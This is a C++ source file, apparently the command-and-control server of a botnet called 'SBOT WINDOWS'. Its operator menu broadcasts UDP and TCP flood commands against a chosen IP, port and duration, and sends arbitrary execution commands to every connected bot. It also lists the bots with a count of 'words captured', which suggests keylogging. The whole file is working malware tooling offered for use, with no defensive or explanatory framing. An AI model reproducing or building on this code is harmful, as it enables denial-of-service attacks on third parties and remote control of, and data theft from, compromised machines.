#include "server.hpp"
#include <thread>

int main ( void )
{

    std::cout
        << "[SBOT WINDOWS]\n"
        << std::endl;
    
    server *oServer = new server("0.0.0.0", 3333);
    if (!oServer->setup())
    {
        std::cout << "[SETUP FAILED]\n";
        exit(0);
    }

    std::cout << "[SETUP SUCCESS]\n";

    std::thread(&server::handler, oServer).detach();

    std::cout << "[THREADED BOT LOOP]\n";

    std::string command{};
    int count = 0;
    std::string ip{};
    std::string port{};
    std::string time{};
    std::string exec_cmd{};
    while (true)
    {
        command.clear();
        std::cout
            << "[SBOT COMMANDS]\n"
            << "UDP\n"
            << "TCP\n"
            << "EXEC\n"
            << "KILLALL\n"
            << "BOTS\n"
            << "EXIT\n"
            << std::endl;
            std::cout << "Enter command: ";
        
        std::cin >> command;

        if (command == "BOTS" || command == "bots")
        {
            count = 0;
            for (bot *nbot : oServer->bots)
            {
                std::cout << "[#" << count << "] - [Name: " << nbot->unique_name << " ] - [ IP: " << nbot->ip << " ] - [ PORT: " << nbot->port << " ] - [ WORDS CAPTURED: " << nbot->words.size() << " ] - [ Alive: " << nbot->isAlive << " ]\n"; 
                count += 1;
            }
        }

        if (command == "EXIT" || command == "exit")
        {
            oServer->cleanup();
            exit(0);
        }

        if (command == "KILLALL" || command == "killall")
        {
            for (bot *nbot : oServer->bots)
                close(nbot->fd);
        }

        if (command == "UDP" || command == "udp")
        {
            std::cout << "Enter Ip: ";
            std::cin >> ip;
            std::cout << "Enter Port: ";
            std::cin >> port;
            std::cout << "Enter Time: ";
            std::cin >> time;
            oServer->brodcast("udp " + ip + " " + port + " " + time);
        }

        if (command == "TCP" || command == "tcp")
        {
            std::cout << "Enter Ip: ";
            std::cin >> ip;
            std::cout << "Enter Port: ";
            std::cin >> port;
            std::cout << "Enter Time: ";
            std::cin >> time;
            oServer->brodcast("tcp " + ip + " " + port + " " + time);
        }

        if (command == "EXEC" || command == "exec")
        {
            std::cout << "Enter Execution Command: ";
            std::cin >> exec_cmd;
            oServer->brodcast("exec " + exec_cmd);
        }


    }

    return EXIT_SUCCESS;
}